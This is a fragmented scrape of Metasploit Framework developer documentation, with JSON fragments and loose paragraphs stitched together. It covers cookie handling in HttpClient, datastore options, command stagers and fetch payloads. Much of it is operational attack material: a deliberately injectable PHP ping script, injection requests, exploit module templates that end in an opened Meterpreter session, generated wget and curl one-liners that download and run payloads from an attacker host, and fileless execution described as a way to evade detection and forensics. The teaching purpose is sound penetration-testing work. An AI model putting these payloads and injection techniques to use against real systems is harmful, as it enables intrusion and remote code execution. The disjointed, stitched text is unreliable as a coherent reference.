    "content": "Part of send_request_cgi functionality is the ability to collect, edit, and send cookies via the HttpClient’s cookie_jar variable, an instance of the HttpCookieJar class. A HttpCookieJar is a collection of HttpCookie. The Jar can be populated manually with it’s add method, or automatically via the keep_cookies option that can be passed to send_request_cgi. If you need to clear the cookie jar (for instance, using a 2nd login), try: . cookie_jar.clear . keep_cookies option . Shown below is the request used to login to a gitlab account in the gitlab_file_read_rce exploit module . res = @http_client.send_request_cgi({ 'method' =&gt; 'POST', 'uri' =&gt; '/users/sign_in', 'keep_cookies' =&gt; true, 'vars_post' =&gt; { 'utf8' =&gt; '✓', 'authenticity_token' =&gt; csrf_token, 'user[login]' =&gt; username, 'user[password]' =&gt; password, 'user[remember_me]' =&gt; 0 } }) . The cookies returned by the server with a successful login need to be attached to all future requests, so 'keep_cookies' =&gt; true, is used to add all returned cookies to the HttpClient CookieJar and attach them to all subsequent requests. cookie option . Shown below is the request used to login to a gitlab account in the artica_proxy_auth_bypass_service_cmds_peform_command_injection module . artica_proxy_auth_bypass_service_cmds_peform_command_injection requires a specific cookie header to be sent with a request in order to achieve RCE. By setting a string of the desired header as the value of the cookie option, that string is set as the cookie header without any changes, allowing the exploit to be carried out. res = send_request_cgi({ 'method' =&gt; 'GET', 'uri' =&gt; normalize_uri(target_uri.path, 'cyrus.index.php'), 'vars_get' =&gt; { 'service-cmds-peform' =&gt; \"||#{Rex::Text.uri_encode(cmd, 'hex-all')}||\" }, 'cookie' =&gt; \"PHPSESSID=#{@phpsessid}; AsWebStatisticsCooKie=1; shellinaboxCooKie=1\" }) . Any object passed to cookie that isn’t an instance of HttpCookieJar will have to_s called on it. The result of to_s will be set as the cookie header of the http request. The contents of the HttpClient cookie_jar is ignored only this request. Subsequent requests are unaffected. Module authors can also pass an instance of HttpCookieJar with the cookie option: . cj = Msf::Exploit::Remote::HTTP::HttpCookieJar.new cj.add(Msf::Exploit::Remote::HTTP::HttpCookie.new('PHPSESSID', @phpsessid)) cj.add(Msf::Exploit::Remote::HTTP::HttpCookie.new('AsWebStatisticsCooKie', 1)) cj.add(Msf::Exploit::Remote::HTTP::HttpCookie.new('shellinaboxCooKie', 1)) res = send_request_cgi({ 'method' =&gt; 'GET', 'uri' =&gt; normalize_uri(target_uri.path, 'cyrus.index.php'), 'vars_get' =&gt; { 'service-cmds-peform' =&gt; \"||#{Rex::Text.uri_encode(cmd, 'hex-all')}||\" }, 'cookie' =&gt; cj }) . The above code would create an identical cookie header to the one used in the previous example, save for a random ordering of the name value pairs. This shouldn’t affect how the server would read the cookies, but it’s still worth keeping in mind if you’ve somehow found a vuln reliant on the order of cookies in a header. expire_cookies . send_request_cgi will call cleanup on cookie_jar before iot is used to populate a request with cookies. cleanup will remove any expired cookies permenetly from the jar, affecting all future requests. If this behaviour isn’t deisred and an author would prefer to keep expired cookies in the jar, the expire_cookies option can be set to false: . res = send_request_cgi({ 'method' =&gt; 'GET', 'uri' =&gt; normalize_uri(target_uri.path, 'cyrus.index.php'), 'vars_get' =&gt; { 'service-cmds-peform' =&gt; \"||#{Rex::Text.uri_encode(cmd, 'hex-all')}||\" }, 'cookie' =&gt; \"PHPSESSID=#{@phpsessid}; AsWebStatisticsCooKie=1; shellinaboxCooKie=1\", 'expire_cookies' =&gt; false }) .

Normally, the most common solution to get around vars_get is to leave your stuff in the uri key. msftidy will flag this, but only as an “Info” and not a warning, which means you should still pass msftidy anyway.

You do not need to manually do basic auth in your request, because HttpClient should automatically do that for you. All you have to do is set the username and password in the datastore options, and then the mixin will use that when the web server asks. 4 - How do I send a MIME request? . See Rex::MIME::Message .

If you are a Metasploit module developer, the lib/msf/core directory should be more than enough for most of your needs. If you are writing a module that speaks HTTP, then the Msf::Exploit::Remote::HttpClient mixin (which is found in lib/msf/core/exploit/http/client) is most likely the one you want. However, in some scenarios, you actually can’t use the HttpClient mixin. The most common is actually when writing a form-based login module using the LoginScanner API.

    "content": "Even though our main topic of this documentation is about Rex::Proto::Http::Client, it does not know how to make HTTP requests. Instead, Rex::Proto::Http::ClientRequest is actually the mother of all Metasploit’s HTTP requests. So how does Rex::Proto::Http::ClientRequest give birth to an HTTP request? Well, you see son, it all begins when Rex::Proto::Http::Client asks for one with either the #request_cgi or the #request_raw method. The difference is that if #request_cgi is used, the request is meant to be CGI compatible, and in most cases this is what you want. If #request_raw is used, technically it means less options, less CGI compatible. A raw HTTP request supports the following options: . | Option/key name | Data type | Description | . | query | String | Raw GET query string | . | data | String | Raw POST data string | . | uri | String | Raw URI string | . | ssl | Boolean | True to use https://, otherwise http:// | . | agent | String | User-Agent.

    "title": "Read the module description and references",
    "content": "This may sound surprising, but sometimes we get asked questions that are already explained in the module. You should always look for the following in the description or the references it provides before deciding whether it’s appropriate to use the exploit or not: . | What products and versions are vulnerable: This is the most basic thing you should know about a vulnerability. | What type of vulnerability and how it works: Basically, you are learning the exploit’s side-effects. For example, if you’re exploiting a memory corruption, if it fails due to whatever reason, you may crash the service. Even if it doesn’t, when you’re done with the shell and type “exit”, it’s still possible to crash it too. High level bugs are generally safer, but not 100%. For example, maybe it needs to modify a config file or install something that can cause the application to be broken, and may become permanent. | Which ones have been tested: When a module is developed, usually the exploit isn’t tested against every single setup if there are too many. Usually the developers will just try to test whatever they can get their hands on. So if your target isn’t mentioned here, keep in mind there is no guarantee it’s going to work 100%. The safest thing to do is to actually recreate the environment your target has, and test the exploit before hitting the real thing. | What conditions the server must meet in order to be exploitable: Quite often, a vulnerability requires multiple conditions to be exploitable. In some cases you can rely on the exploit’s check command, because when Metasploit flags something as vulnerable, it actually exploited the bug. For browser exploits using the BrowserExploitServer mixin, it will also check exploitable requirements before loading the exploit. But automation isn’t always there, so you should try to find this information before running that “exploit” command. Sometimes it’s just common sense, really. For example: a web application’s file upload feature might be abused to upload a web-based backdoor, and stuff like that usually requires the upload folder to be accessible for the user. If your target doesn’t meet the requirement(s), there is no point to try. | . You can use the info command to see the module’s description: . msf exploit(ms08_067_netapi) &gt; info . ",

What this means is that you should never assume the exploit will automatically select a target for you if you’ve never used it before, and that the default setup might not be the one you’re testing against.

    "title": "The Vulnerability Test Case",
    "content": "The best way to explain how to use a command stager is probably by demonstrating it. Here we have a command injection vulnerability in example PHP code, something silly you actually might see in enterprise-level software. The bug is that you can inject additional system commands in the system call for ping: . &lt;?php if ( isset($_GET[\"ip\"]) ) { $output = system(\"ping -c 1 \" . $_GET[\"ip\"]); die($output); } ?&gt; &lt;html&gt; &lt;body&gt; &lt;form action = \"ping.php\" method = \"GET\"&gt; IP to ping: &lt;input type = \"text\" name = \"ip\" /&gt; &lt;input type = \"submit\" /&gt; &lt;/form&gt; &lt;/body&gt; &lt;/html&gt; . Place the above PHP script (ping.php) on an Ubuntu + Apache + PHP server. Make sure your Apache server isn’t exposed to the Internet! . Under normal usage, this is how the script behaves - it just pings the host you specify, and shows you the output: . $ curl \"http://192.168.1.203/ping.php?ip=127.0.0.1\" PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data. 64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.017 ms --- 127.0.0.1 ping statistics --- 1 packets transmitted, 1 received, 0% packet loss, time 0ms rtt min/avg/max/mdev = 0.017/0.017/0.017/0.000 ms rtt min/avg/max/mdev = 0.017/0.017/0.017/0.000 ms . OK, now we can abuse that a little and execute another command (id): . $ curl \"http://192.168.1.203/ping.php?ip=127.0.0.1+%26%26+id\" PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data. 64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.020 ms --- 127.0.0.1 ping statistics --- 1 packets transmitted, 1 received, 0% packet loss, time 0ms rtt min/avg/max/mdev = 0.020/0.020/0.020/0.000 ms uid=33(www-data) gid=33(www-data) groups=33(www-data) uid=33(www-data) gid=33(www-data) groups=33(www-data) . See the www-data? That is the output for the second command we asked the script to execute. By doing that, we can also do something even more nasty - like writing a Meterpreter payload onto the target system, and execute it. ",

    "doc": "How to use command stagers",
    "title": "The Msf::Exploit::CmdStager Mixin",
    "content": "Now let’s talk about how to use a command stager to exploit the above script. There are a couple of steps you need to do: . 1. Include the Msf::Exploit::CmdStager mixin . Although there are many flavors of mixins/stagers, you only need to include Msf::Exploit::CmdStager when writing a Metasploit exploit. The mixin is basically an interface to all command stagers: . include Msf::Exploit::CmdStager . 2. Declare your flavors . To tell Msf::Exploit::CmdStager what flavors you want, you can add the CmdStagerFlavor info in the module’s metadata. Either from the common level, or the target level. Multiple flavors are allowed. Remember that different flavors have different approaches to staging the payload for execution. Some flavors will break the payload apart and embed the payload data into multiple echo or printf commands to write it to disk; others like wget and curl execute a command to retrieve the payload via network connection. Your chosen flavor will be determined by the availability of a given command on the target system, the size of the command, the size of the payload, the ability to call out on the network, and the security posture of the target. An example of setting flavors for a specific target: . 'Targets' =&gt; [ [ 'Windows', { 'Arch' =&gt; [ ARCH_X86_64, ARCH_X86 ], 'Platform' =&gt; 'win', 'CmdStagerFlavor' =&gt; [ 'certutil', 'vbs' ] } ] ] . Or, you can pass this info to the execute_cmdstager method (see Step 4 to begin). execute_cmdstager(flavor: :vbs) . However, it is best to set the compatible list of flavors in CmdStagerFlavor, rather than hard-coding the flavor in the execute_cmdstager method call, as this allows the operator to choose a flavor from msfconsole with set CmdStager::flavor . 3. Create the execute_command method . You also must create a def execute_command(cmd, opts = {}) method in your module. This is how you define how to execute a command on the target. The parameter cmd is the command to execute. When writing the execute_cmd method, remember that a great deal of work might already be done for you. Here is an example of a web host that executes a command as part of a request: . def execute_command(cmd, _opts = {}) populate_values if @sid.nil? || @token.nil? uri = datastore['URIPATH'] + '/vendor/htmlawed/htmlawed/htmLawedTest.php' send_request_cgi({ 'method' =&gt; 'POST', 'uri' =&gt; normalize_uri(uri), 'cookie' =&gt; 'sid=' + @sid, 'ctype' =&gt; 'application/x-www-form-urlencoded', 'encode_params' =&gt; true, 'vars_post' =&gt; { 'token' =&gt; @token, 'text' =&gt; cmd, 'hhook' =&gt; 'exec', 'sid' =&gt; @sid } }) end . Since the command is encapsulated within a request, it will be encoded for us. When building and debugging an execute_command method that uses web requests, remember that set httptrace true will automatically display the http traffic as it is sent and received. 4. Decide on the supported payloads . CmdStagers are intended to support payloads that are uploaded, saved to disk, and launched, but many of the payloads in Metasploit Framework do not need to be saved to disk; these payloads are ARCH_CMD payloads that rely on software already present on the target system like netcat, bash, python, or ssh. Depending on whether the payload needs to be saved to disk or not changes what payloads are supported and how we launch the payload, so we must provide the user the ability to pick between the two. The best way to let the user decide what kind of payload to use is by defining separate targets . Here is an example targets section from a command injection module: . 'Targets' =&gt; [ [ 'Unix Command', { 'Platform' =&gt; 'unix', 'Arch' =&gt; ARCH_CMD, 'Type' =&gt; :unix_cmd, 'DefaultOptions' =&gt; { 'PAYLOAD' =&gt; 'cmd/unix/python/meterpreter/reverse_tcp', 'RPORT' =&gt; 9000 } } ], [ 'Linux (Dropper)', { 'Platform' =&gt; 'linux', 'Arch' =&gt; [ARCH_X64], 'DefaultOptions' =&gt; { 'PAYLOAD' =&gt; 'linux/x64/meterpreter/reverse_tcp' }, 'Type' =&gt; :linux_dropper } ], . The first target is the ARCH_CMD target and unix platform. This allows the user to select any payload that starts with cmd/unix. These payloads do not need to be saved to disk because they are “just” a command, rather than an executable file. As such, they can be contained and launched within a command line string. The second is ARCH_X64 and the platform is linux; this lets us choose any payload that starts with linux/x64 and includes binary elf payloads. These payload types must be saved to disk before they can be launched, and as such, you will often see this second type of payload referred to as a ‘dropper’ because the file must be ‘dropped’ to the disk before it can be executed. In each of the targets above, we’ve selected a default payload we know will work. 4. Executing a payload As we said earlier, the way a payload is executed depends on the payload type. By including Msf::Exploit::CmdStager you are given access to a method called execute_cmdstager. execute_cmdstager makes a list of required commands to encode, upload, save, decode, and execute your payload, then uses the execute_command method you defined earlier to run each command on the target. Unfortunately, we just mentioned not all payloads need to be saved to disk. In the case of a payload that does not need to be saved to disk, we only need to call execute_command. This problem of payload/method juggling sounds far worse than it is. Below is a quick example of how simple the exploit method will become if you have properly defined your targets as discussed in step 3: . def exploit print_status(\"Executing #{target.name} for #{datastore['PAYLOAD']}\") case target['Type'] when :unix_cmd execute_command(payload.encoded) when :linux_dropper execute_cmdstager end end . That’s it. If the user selects an ARCH_CMD payload, we call the execute_command method on the payload because as we said earlier, these payloads will execute within a single command. If the user has selected a dropped payload like ARCH_X64 or ARCH_X86, then we call execute_cmdstager which figures out the series of commands necessary to save the file to disk and launch it based on the flavor and max size you set earlier. Over the years, we have also learned that these options are quite handy when calling execute_cmdstager: . | flavor - You can specify what command stager (flavor) to use from here. | delay - How much time to delay between each command execution. 0.25 is default. | linemax - Maximum number of characters per command. 2047 is default. | . Msf::Exploit::CmdStager Template . At the minimum, this is how your exploit should start when you’re using the CmdStager mixin: . class MetasploitModule &lt; Msf::Exploit::Remote Rank = NormalRanking include Msf::Exploit::CmdStager def initialize(info = {}) super( update_info( info, 'Name' =&gt; 'Command Injection Using CmdStager', 'Description' =&gt; %q{ This exploits a command injection using the command stager. }, 'License' =&gt; MSF_LICENSE, 'Author' =&gt; [ 'sinn3r' ], 'References' =&gt; [ [ 'URL', 'http://metasploit.com' ] ], 'Platform' =&gt; 'linux', 'Targets' =&gt; [ [ 'Linux', {} ] ], 'Payload' =&gt; { 'BadChars' =&gt; \"\\x00\" }, 'CmdStagerFlavor' =&gt; [ 'printf' ], 'Privileged' =&gt; false, 'DisclosureDate' =&gt; '2016-06-10', 'DefaultTarget' =&gt; 0 ) ) end def execute_command(cmd, opts = {}) # calls some method to inject cmd to the vulnerable code. end def exploit print_status('Exploiting...') execute_cmdstager end end . As you can see, we have chosen the “printf” flavor as our command stager. We will explain more about this later, but basically what it does is it writes our payload to /tmp and executes it. Now let’s modify the execute_command method and get code execution against the test case. Based on the PoC, we know that our injection string should look like this: . 127.0.0.1+%26%26+[Malicious commands] . We do that in execute_command using HttpClient. Notice there is actually some bad character filtering involved to get the exploit working correctly, which is expected: . def filter_bad_chars(cmd) cmd.gsub!(/chmod \\+x/, 'chmod 777') cmd.gsub!(/;/, ' %26%26 ') cmd.gsub!(/ /, '+') end def execute_command(cmd, _opts = {}) send_request_cgi( { 'method' =&gt; 'GET', 'uri' =&gt; '/ping.php', 'encode_params' =&gt; false, 'vars_get' =&gt; { 'ip' =&gt; \"127.0.0.1+%26%26+#{filter_bad_chars(cmd)}\" } } ) end def exploit print_status('Exploiting...') execute_cmdstager end . And let’s run that, we should have a shell: . msf exploit(cmdstager_demo) &gt; run [*] Started reverse TCP handler on 10.6.0.92:4444 [*] Exploiting... [*] Transmitting intermediate stager for over-sized stage...(105 bytes) [*] Sending stage (1495599 bytes) to 10.6.0.92 [*] Meterpreter session 1 opened (10.6.0.92:4444 -&gt; 10.6.0.92:51522) at 2016-06-10 11:51:03 -0500 .

This delineation can be important, as trying to write a stageless binary payload to disk using a stager that has to include the chunked payload in it will require the execution of dozens of commands, often each one having the signature of the exploit. It is also useful to know the printf flavor is the only flavor that embeds the payload into the commands but does not use echo. Available flavors: .

For example, in msfconsole, you can set the ConsoleLogging option in order to log all the console input/output - something that’s kind of handy for documentation purposes during a pentest. When you load a module, there will be a lot more options registered by the mixin(s) or the module. Some common ones include RHOSTS and RPORT for a server-side exploit or auxiliary module, SRVHOST for a client-side module, etc. The best way to find out exactly what datastore options you can set is by using these commands: . | show options - Shows you all the basic options. | show advanced - Shows you all the advanced options. | show missing - Shows you all the required options you have not configured. | set - Shows you everything.

    "content": "On the development side, things are a little crazier. Datastore options actually can be found in at least four different sources: the ModuleDataStore object, active_module, session object, or the framework object. If you’re just doing module development, the best source you can trust is the ModuleDataStore object. This object has a specific load order before handing you the option you want: if the option can be found in the module’s datastore, it will give you that. If not found, it will give you the one from framework. The following is an example of how to read a datastore option in a module: . current_host = datastore['RHOST'] . If your dev work is outside the module realm, there is a good possibility that you don’t even have the ModuleDataStore object. But in some cases, you still might be able to read from the active_module accessor from the driver. Or if you have access to ModuleCommandDispatcher, there is a mod method too that gives you the same thing, and sometimes mixins pass this around in a run_simple method while dispatching a module. One example you can look at is the Msf::Ui::Console::CommandDispatcher::Auxiliary class. In some cases such as running a script in post exploitation, you might not have ModuleDataStore or even active_module, but you should still have a session object. There should be an exploit_datastore that gives you all the datastore options: . session.exploit_datastore . If you don’t have access to the module, or to a session object, the last source is obviously the framework object, and there is ALWAYS a framework object. However, like we said earlier, if the user sets a module-level option, no other components will see it, this includes the framework object: . framework.datastore . So now you know there are multiple sources of datastore options. And hopefully at this point you are well aware that not all sources necessarily share the same thing. If you have to try everything, as a general rule, this should be your load order: . | Try from the ModuleDataStore | Try from active_module | Try from session | Try from framework | . ",

Note if the first attribute is false, you don’t need to provide a value, it’ll be set to nil automatically. | enums - optional An array of acceptable values, e.g. %w[ LEFT RIGHT ]. | aliases - optional, key-word only An array of additional names that refer to this option. This is useful when renaming a datastore option to retain backward compatibility. See the Renaming datastore options section for more information | conditions - optional, key-word only An array of a condition for which the option should be displayed. This can be used to hide options when they are irrelevant based on other configurations. See the Filtering datastore options section for more information. | fallbacks optional, key-word only An array of names that will be used as a fallback if the main option name is defined by the user.

    "title": "A Simple Stand-Alone Example",
    "content": "The fastest way to understand Fetch Payloads is to use them and examine the output. For example, let’s assume a Linux target with the ability to connect back to us with an HTTP connection and a command execution vulnerability. First, let’s look at the payload in isolation: . msf exploit(multi/ssh/sshexec) &gt; use payload/cmd/linux/http/x64/meterpreter/reverse_tcp msf payload(cmd/linux/http/x64/meterpreter/reverse_tcp) &gt; show options Module options (payload/cmd/linux/http/x64/meterpreter/reverse_tcp): Name Current Setting Required Description ---- --------------- -------- ----------- FETCH_COMMAND CURL yes Command to fetch payload (Accepted: CURL, FTP, TFTP, TNFTP, WGET) FETCH_FILENAME YXeSdwsoEfOH no Name to use on remote system when storing payload FETCH_SRVHOST 0.0.0.0 yes Local IP to use for serving payload FETCH_SRVPORT 8080 yes Local port to use for serving payload FETCH_URIPATH no Local URI to use for serving payload FETCH_WRITABLE_DIR yes Remote writable dir to store payload LHOST yes The listen address (an interface may be specified) LPORT 4444 yes The listen port View the full module info with the info, or info -d command. msf payload(cmd/linux/http/x64/meterpreter/reverse_tcp) &gt; . Options . FETCH_COMMAND is the binary we wish to run on the remote host to download the adapted payload. Currently, the supported options are CURL FTP TFTP TNFTP WGET on Linux hosts and CURL TFTP CERTUTIL on Windows hosts. We’ll get into more details on the binaries later. FETCH_SRVHOST is the IP where the server will listen. FETCH_SRVPORT is the port where the server will listen. FETCH_URIPATH is the URI corresponding to the payload file. The default value is deterministic based on the underlying payload so a payload created in msfvenom will match a listener started in Framework assuming the underlying served payload is the same. Dependent Options . FETCH_FILELESS is an option that specifies a method to modify the fetch command to download the binary payload to memory rather than disk before execution, thus avoiding some HIDS and making forensics harder. Currently, there are two options: shell, shell-search and python3.8+. All of these require the target to be running Linux Kernel 3.17 or above. This option is only available when the platform is Linux. FETCH_FILENAME is the name you’d like the executable payload saved as on the remote host. This option is not supported by every binary and must end in .exe on Windows hosts. The default value is random. This option is only available when FETCH_FILELESS is set to none . FETCH_PIPE is a binary flag that will create a second resource containing the original fetch command to run and then will produce a much shorter command to run on the host that will download the original fetch command and pipe it directly to the target’s shell. Use this option if there is a limit on the command size as it will result in a much smaller original command. When set to true, the FETCH_URIPATH option is used for the pipe command resource uri and the default FETCH_URIPATHvalue is used for the original binary payload uri. This option is only available when the fetch transport is HTTP or HTTPS and the payload platform is Linux with the FETCH_COMMAND set to CURL or WGET or the platform is Windows and the FETCH_COMMAND is CURL . FETCH_WRITABLE_DIR is the directory on the remote host where we’d like to store the served payload prior to execution. This value is not supported by all fetch binaries. If you set this value and it is not supported, it will generate an error. This option is only available when FETCH_FILELESS is set to none . The remaining options will be the options available to you in the served payload; in this case our served payload is linux/x64/meterpreter/reverse_tcp so our only added options are LHOST and LPORT. If we had selected a different payload, we would see different options. Fileless Execution . For Linux payloads, we support fileless ELF execution - this option is enabled with FETCH_FILELESS. Currently, this option can be the following values: python3.8+, shell-search, and shell. The basic idea behind all of them is the same: execute the payload from an anonymous file handle, which should never touch a disk, thereby adding a layer of stealth. The shell-search option searches for available anonymous file handles available on the system, copies the payload into the one it finds, and executes the payload from that handle. This method uses POSIX commands only so that it can be run in any shell. The shell option uses a slightly different approach: it runs the assembly stub from a shell, creates an anonymous file handle inside of the shell process, copies the payload into a new handle, and then runs it. Finally, it will kill the original shell process, leaving the payload running as orphan process. This method uses a syscall memfd_create to create an anonymous file handle. This option can be used in any Linux shell. The python3.8+ option uses the same technique as the shell option. However, it all happens in Python code. It will call the os.memfd_create function, which will create an anonymous file handle from the Python process. Then, it uses os.system to copy the payload into a new file handle and execute it. This option requires Python version 3.8 or higher on the target machine. Generating the Fetch Payload . msf payload(cmd/linux/http/x64/meterpreter/reverse_tcp) &gt; set FETCH_COMMAND WGET FETCH_COMMAND =&gt; WGET msf payload(cmd/linux/http/x64/meterpreter/reverse_tcp) &gt; set FETCH_SRVHOST 10.5.135.201 FETCH_SRVHOST =&gt; 10.5.135.201 msf payload(cmd/linux/http/x64/meterpreter/reverse_tcp) &gt; set FETCH_SRVPORT 8000 FETCH_SRVPORT =&gt; 8000 msf payload(cmd/linux/http/x64/meterpreter/reverse_tcp) &gt; set LHOST 10.5.135.201 LHOST =&gt; 10.5.135.201 msf payload(cmd/linux/http/x64/meterpreter/reverse_tcp) &gt; set LPORT 4567 LPORT =&gt; 4567 msf payload(cmd/linux/http/x64/meterpreter/reverse_tcp) &gt; generate -f raw wget -qO ./YXeSdwsoEfOH http://10.5.135.201:8000/3cP1jDrJ3uWM1WrsRx3HTw; chmod +x ./YXeSdwsoEfOH; ./YXeSdwsoEfOH &amp; msf payload(cmd/linux/http/x64/meterpreter/reverse_tcp) &gt; . You can see the fetch payload generated: wget -qO ./YXeSdwsoEfOH http://10.5.135.201:8000/3cP1jDrJ3uWM1WrsRx3HTw; chmod +x ./YXeSdwsoEfOH; ./YXeSdwsoEfOH &amp; This command downloads the served payload, marks it as executable, and then executes it on the remote host. Starting the Fetch Server . When you start the Fetch Handler, it starts both the server hosting the binary payload and the listener for the served payload. With verbose set to true, you can see both the Fetch Handler and the Served Payload Handler are started: . msf payload(cmd/linux/http/x64/meterpreter/reverse_tcp) &gt; to_handler [*] wget -qO ./YBybOrAmkV http://10.5.135.201:8000/3cP1jDrJ3uWM1WrsRx3HTw; chmod +x ./YBybOrAmkV; ./YBybOrAmkV &amp; [*] Payload Handler Started as Job 0 [*] Fetch Handler listening on 10.5.135.201:8000 [*] http server started [*] Started reverse TCP handler on 10.5.135.201:4567 . Fetch Handlers and Served Payload Handlers . The Fetch Handler is tracked with the Served Payload Handler, so you will only see the Served Payload Handler under Jobs, even though the Fetch Handler is listening: . msf payload(cmd/linux/http/x64/meterpreter/reverse_tcp) &gt; jobs -l Jobs ==== Id Name Payload Payload opts -- ---- ------- ------------ 0 Exploit: multi/handler cmd/linux/http/x64/meterpreter/reverse_tcp tcp://10.5.135.201:4567 msf payload(cmd/linux/http/x64/meterpreter/reverse_tcp) &gt; netstat -ant | grep 8000 [*] exec: netstat -ant | grep 8000 tcp 0 0 10.5.135.201:8000 0.0.0.0:* LISTEN .

Once the target has been added, you can get access to the command by invoking payload.encoded and use it as the command to execute on the remote target. Example paired with CmdStager . There is likely to be some overlap between fetch payloads and command stagers. Let’s talk briefly about how to support both in an exploit. Please see the documentation on Command Stagers for required imports and specifics for command stagers. in this case, I’m only documenting the changes to make so that fetch payloads will work alongside command stagers or to use fetch payloads in the style of command stagers, which I suggest you do. In this case, I’ve modified the code provided in the command stager documentation to support both linux and unix command payloads. All I did was give an array value for the Platform value and change theType to something more generic: . 'Targets' =&gt; [ [ 'Linux Command', { 'Arch' =&gt; [ ARCH_CMD ], 'Platform' =&gt; [ 'unix', 'linux' ], 'Type' =&gt; :nix_cmd } ] ] . For the execute_command method, nothing changes: . def execute_command(cmd, _opts = {}) populate_values if @sid.nil? || @token.nil? uri = datastore['URIPATH'] + '/vendor/htmlawed/htmlawed/htmLawedTest.php' send_request_cgi({ 'method' =&gt; 'POST', 'uri' =&gt; normalize_uri(uri), 'cookie' =&gt; 'sid=' + @sid, 'ctype' =&gt; 'application/x-www-form-urlencoded', 'encode_params' =&gt; true, 'vars_post' =&gt; { 'token' =&gt; @token, 'text' =&gt; cmd, 'hhook' =&gt; 'exec', 'sid' =&gt; @sid } }) end . The only change in the exploit method is the use of the more generic Type value in the case statement. Nothing else needs to change. def exploit print_status(\"Executing #{target.name} for #{datastore['PAYLOAD']}\") case target['Type'] when :nix_cmd execute_command(payload.encoded) when :linux_dropper execute_cmdstager end end . If you have an exploit that already supports Unix Command payloads and you’d like it to support Linux Command payloads like Fetch Payloads, you can simply add the linux value to the platform array: . 'Nix Command', { 'Platform' =&gt; [ 'unix', 'linux' ], 'Arch' =&gt; ARCH_CMD, 'Type' =&gt; :unix_cmd, } . ",

    "title": "Supported Commands",
    "content": "Windows And Linux Both . CURL . cURL comes pre-installed on Windows 10 and 11, and it is incredibly common on linux platforms and the options are very standardized across releases and platforms. This makes cURL a good default choice for both Linux and Windows targets. All options and server protocol types are supported by the cURL command. TFTP . The TFTP binary is useful only in edge cases because of a long list of limitations: 1) It is a Windows feature, but it is turned off by default on Windows Vista and later. 2) While you are likely to find it on Linux and Unix hosts, the options are not standard across releases. 3) The TFTP binary included in many Linux systems and all Windows systems does not allow for the port to be configured, nor does it allow for the destination filename to be configured, so FETCH_SRVPORT must always be set to 69 and FETCH_WRITABLE_DIR and FETCH_FILENAME must be empty. Listening on port 69 in Framework can be problematic, so I suggest that you use the advanced option FetchListenerBindPort to start the server on a different port and redirect the connection with a tool like iptables to a high port. For example, if you are on a linux host with iptables, you can execute the following commands to redirect a connection on UDP port 69 to UDP port 3069: sudo iptables -t nat -I PREROUTING -p udp --dport 69 -j REDIRECT --to-ports 3069 sudo iptables -t nat -I OUTPUT -p udp -d 127.0.0.1 --dport 69 -j REDIRECT --to-ports 3069 Then, you can set FetchListenerBindPort to 3069 and get the callback correctly. 4) Because tftp is a udp-based protocol and because od the implementation of the server within Framework, each time you start a tftp fetch handler, a new service will start: . msf payload(cmd/windows/tftp/x64/meterpreter/reverse_tcp) &gt; jobs Jobs ==== Id Name Payload Payload opts -- ---- ------- ------------ 2 Exploit: multi/handler cmd/windows/tftp/x64/meterpreter/reverse_tcp tcp://10.5.135.201:4444 msf payload(cmd/windows/tftp/x64/meterpreter/reverse_tcp) &gt; set LPORT 4445 LPORT =&gt; 4445 msf payload(cmd/windows/tftp/x64/meterpreter/reverse_tcp) &gt; to_handler [*] Command to run on remote host: curl -so plEYxIdBQna.exe tftp://10.5.135.201:8080/test1 &amp; start /B plEYxIdBQna.exe [*] Payload Handler Started as Job 4 [*] starting tftpserver on 10.5.135.201:8080 [*] Started reverse TCP handler on 10.5.135.201:4445 msf payload(cmd/windows/tftp/x64/meterpreter/reverse_tcp) &gt; jobs Jobs ==== Id Name Payload Payload opts -- ---- ------- ------------ 2 Exploit: multi/handler cmd/windows/tftp/x64/meterpreter/reverse_tcp tcp://10.5.135.201:4444 4 Exploit: multi/handler cmd/windows/tftp/x64/meterpreter/reverse_tcp tcp://10.5.135.201:4445 msf payload(cmd/windows/tftp/x64/meterpreter/reverse_tcp) &gt; netstat -an | grep 8080 [*] exec: netstat -an | grep 8080 udp 0 0 10.5.135.201:8080 0.0.0.0:* udp 0 0 10.5.135.201:8080 0.0.0.0:* msf payload(cmd/windows/tftp/x64/meterpreter/reverse_tcp) &gt; set FETCH_URIPATH test4 FETCH_URIPATH =&gt; test4 msf payload(cmd/windows/tftp/x64/meterpreter/reverse_tcp) &gt; set LPORT 8547 LPORT =&gt; 8547 msf payload(cmd/windows/tftp/x64/meterpreter/reverse_tcp) &gt; to_handler [*] Command to run on remote host: curl -so DOjmRoCOSMn.exe tftp://10.5.135.201:8080/test4 &amp; start /B DOjmRoCOSMn.exe [*] Payload Handler Started as Job 5 [*] starting tftpserver on 10.5.135.201:8080 [*] Started reverse TCP handler on 10.5.135.201:8547 msf payload(cmd/windows/tftp/x64/meterpreter/reverse_tcp) &gt; netstat -an | grep 8080 [*] exec: netstat -an | grep 8080 udp 0 0 10.5.135.201:8080 0.0.0.0:* udp 0 0 10.5.135.201:8080 0.0.0.0:* udp 0 0 10.5.135.201:8080 0.0.0.0:* . There is nothing to stop you from creating a race condition by starting multiple tftp servers with the same IP, port, and FETCH_URI value but serving different payloads. This will result in a race condition where the payload served is non-deterministic. Windows Only . Certutil . Certutil is a great choice for Windows targets- it is likely to be present on most recent releases of Windows and is highly configurable. The one troublesome aspect is that there is no insecure mode for Certutil, so if you are using Certutil with the HTTPS protocol, the certificate must be correct and checked. It supports HTTP and HTTPS protocols. Linux Only . FTP . FTP is an old but useful binary. While we support using the FTP binary, we do not have an FTP server. Modern releases of FTP support both HTTP and HTTPS protocols. Unfortunately, we only support these modern versions of inline FTP, so it may not be appropriate for older systems. TNFTP . TNFTP (not to be confused with TFTP) is a newer version of FTP. It is exactly the same as modern FTP, but sometimes both the legacy FTP and TNFTP are present on a system, so the command will be tnftp rather than ftp. WGET . WGET is likely the first choice for a linux-only target. It supports both HTTPS and HTTP and all Fetch payload options.

Every class in CodeFactory, except for Base, FakeFunction, and FakeFunctionCollection, is a stub candidate that gets randomly selected and used in the source code. If a stub requires a native API call, then the class can specify @dep to set that dependency. If the source code does not support the API call, then the next stub candidate is used (or until one is found). For example, the CRandomizer::CodeFactory::OutputDebugString class is used to generate a fake OutputDebugString call, and the dependency is set as ['OutputDebugString'].

